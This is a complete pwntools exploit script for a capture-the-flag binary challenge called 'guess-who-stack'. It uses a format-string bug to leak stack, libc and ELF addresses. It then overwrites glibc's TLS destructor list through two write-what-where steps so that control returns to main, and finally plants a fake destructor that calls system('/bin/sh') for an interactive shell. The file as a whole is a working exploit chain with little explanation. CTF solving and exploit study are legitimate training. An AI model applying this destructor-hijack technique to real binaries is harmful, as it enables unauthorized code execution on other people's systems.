#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chal_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'guess-who-stack.harkonnen.b01lersc.tf', 8443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    # b *printf+198
    b *main+258
    b *system
    b *__call_tls_dtors
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='chal')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def onegadget():
    result = process(["one_gadget", "-r", "-l", "30", "libc.so.6"]).recvline().decode().strip().split(" ")
    return [int(addr) for addr in result]

def to_signed(val):
    return val if val < (1 << 63) else val - (1 << 64)

def www2times(where, what, where2, what2):
        io.sendlineafter("He opens his mouth but the words don't come out... ", str(where).encode() + b" " + str(what).encode())
        io.sendlineafter("He's chokin how, everbody's jokin now... ", str(where2).encode() + b" " + str(what2).encode())

def exploit():
    global io
    # one_gadget = onegadget()
    io = initialize()
    with log.progress("Leak stack & libc"), context.silent:
        io.sendlineafter("First shot...", b"%p.%a")
        io.recvuntil(b"heavy ")
        stack = int(io.recvuntil(b".", drop=True), 16)
        io.recvuntil(b"0.0")
        libc_leak = int(b"0x"+io.recvuntil(b"p-", drop=True),16) << 4
        libc.address = libc_leak - libc.sym['_IO_2_1_stdout_'] 
        tls = libc.address - 0x28c0
        add_rsp_0x128 = next(libc.search(asm("add rsp, 0x0000000000000128 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret")))
    log.info("Stack: %#x", stack)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    log.info("Tls base: %#x", tls)
    log.info("Add rsp 0x128: %#x", add_rsp_0x128)
    with log.progress("Return to main by overwriting tls_dtor_list"), context.silent:
        www2times(tls + 0x30, 0, libc.sym["initial"] + 24, to_signed((add_rsp_0x128) << 17))

    with log.progress("Leak elf address"), context.silent:
        io.sendlineafter("First shot...", b"%17$p")
        io.recvuntil(b"heavy ")
        elf.address = int(io.recvline().strip(), 16) - elf.sym["_start"]
    log.info("Elf base: %#x", elf.address)

    with log.progress("Return to main by overwriting tls_dtor_list"), context.silent:
        fake_dtor = libc.bss(-0x18) # Next dtor list + 0x18
        www2times(tls - 0x50, fake_dtor, fake_dtor, to_signed((elf.sym["main"]) << 17))
    log.info("Fake dtor: %#x", fake_dtor)
    with log.progress("Leak stack"), context.silent:
        io.sendlineafter("First shot...", b"%6$p")
        io.recvuntil(b"heavy ")
        stack_leak2 = int(io.recvline().strip(), 16)
        fake_dtor = stack_leak2 + 0x158
    log.info("Stack leak2: %#x", stack_leak2)
    log.info("Fake dtor: %#x", fake_dtor)
    with log.progress("Get shell"), context.silent:
        www2times(fake_dtor, to_signed((libc.sym["system"]) << 17), fake_dtor + 0x8, next(libc.search("/bin/sh\0")))
    io.interactive()

if __name__ == '__main__':
    exploit()                                                                                            
